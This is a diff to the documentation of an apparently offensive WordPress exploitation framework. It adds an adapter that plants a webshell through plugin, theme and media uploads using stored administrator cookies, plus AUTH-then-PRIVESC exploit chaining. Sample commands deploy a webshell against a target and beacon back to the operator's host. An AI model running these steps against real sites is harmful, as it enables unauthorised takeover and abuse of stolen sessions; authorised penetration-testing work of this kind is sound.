@@ -17,9 +17,9 @@ CLI mode flow:
 3. Load payload class
 4. run_chain()
    a. Load stored auth (session cookies, credentials)
-   b. Separate AUTH exploits from chain exploits
-   c. Run AUTH exploits first
-   d. Check auth requirements
+   b. Separate AUTH / PRIVESC / chain exploits
+   c. Run AUTH exploits (harvest session/creds), then PRIVESC (escalate)
+   d. Check auth requirements (requires_role) for delivery exploits
    e. Match payload to exploit (right-to-left capability match)
    f. Get instructions from payload
       ↳ XSS→RCE adapter (if active): convert each RCE instruction to XSS delivery JS
@@ -150,19 +150,72 @@ The framework (`chain.py`) owns the listener lifecycle and all XSS-specific
 operator messaging, so the unchanged payload's `report()` never has to know this
 happened. See `lib/adapter.py` and `lib/beacon_server.py`.
 
-## AUTH Flow
+## AUTH→RCE Adapter
 
-AUTH exploits run before everything else. They produce session cookies
-and/or credentials which are stored and passed to subsequent exploits.
+The direct-HTTP twin of the XSS→RCE adapter. It delivers an RCE payload with **no
+exploit at all**, using a stored **administrator** session as the vector — the
+same upload/editor sinks, but run from the operator's machine over authenticated
+requests instead of in a victim's browser.
+
+```bash
+# Deploy a webshell using stored admin cookies (no exploit needed)
+hwp -t http://target.com --payload webshell --auth-rce-adapter
+
+# Confirm server-side execution with a beacon
+hwp -t http://target.com --payload webshell --auth-rce-adapter --lhost 10.0.0.5 --lport 8888
+```
+
+It activates when the chain has an RCE payload, a stored session, and **no
+delivery exploit** (`chain.py` routes the payload-only run to
+`_run_auth_adapter`). The gated beacon loader is reused verbatim from
+`lib.adapter.build_loader`; `lib/auth_adapter.py` ports the five sinks
+(plugin-upload, theme-upload, media-upload, theme-editor, plugin-editor) to
+`requests` + the stored cookies, and verifies each by requesting the written file
+with `?hwp-beacon=1`. Needs an administrator-capability session.
+
+This also means you can run yesterday's AUTH result today with just a payload: the
+session persists in `~/.hackwp/sessions/`, so `--payload … --auth-rce-adapter`
+picks it up with no AUTH exploit in the chain.
+
+## Auth Phase (AUTH → PRIVESC)
+
+Two capabilities run in the auth phase, before any delivery exploit and without a
+payload:
+
+- **AUTH** — gains authentication (anonymous → a role). Must return `session`
+  and/or `credentials`; a successful AUTH that returns neither is an error. Runs
+  first.
+- **PRIVESC** — raises an *existing* identity to a higher role. Runs after AUTH,
+  so `AUTH → PRIVESC → delivery` chains work.
 
 ```
-AUTH exploit runs → result.session → stored in ~/.hackwp/sessions/
-                  → result.credentials → stored in ~/.hackwp/sessions/
-                  → session cookies passed to HTTP instances
+AUTH exploit runs   → result.session / result.credentials → stored in ~/.hackwp/sessions/
+credentials→session bridge (wp-login.php) if we have creds but no cookies
+PRIVESC exploit runs (needs the session)  → any new session/creds stored
+                    → session cookies passed to subsequent HTTP instances
 ```
 
-If an exploit has `auth_required = True` but no session exists,
-the framework exits with a clear error before anything runs.
+### Role model
+
+Exploits declare `requires_role` (privilege to run) and `grants_role` (privilege
+achieved), keyed to WordPress default roles:
+
+```
+anonymous < subscriber ≈ customer < contributor < author < editor < administrator
+```
+
+`requires_role` accepts `False`/`None` (anonymous), `True` (any authenticated),
+or a role name (that role or higher). The legacy `auth_required = True` is an
+alias for `requires_role = True`. If a delivery exploit needs auth
+(`requires_role != anonymous`) and no session exists, the framework exits with a
+clear error before anything runs.
+
+### Multi-capability / OTHER
+
+`capability` may be a list; the framework picks one **mode** per run and exposes
+it as `self.mode`. AUTH/PRIVESC modes route to the auth phase; a delivery mode is
+claimed by payload matching; `OTHER` runs as an operator-driven action that
+carries no payload. The operator forces a non-delivery mode with `--as <CAP>`.
 
 Exploits request auth on individual HTTP calls with `auth=True`:
 ```python
@@ -294,6 +347,7 @@ hwp/
 │   └── __init__.py
 ├── lib/                    # Framework internals
 │   ├── adapter.py          # XSS→RCE adapter (core transformer)
+│   ├── auth_adapter.py     # AUTH→RCE adapter (deliver via stored admin session)
 │   ├── beacon_server.py    # Beacon listener for server-side RCE confirmation
 │   ├── chain.py            # Chain resolver & executor
 │   ├── exploit.py          # Exploit base class
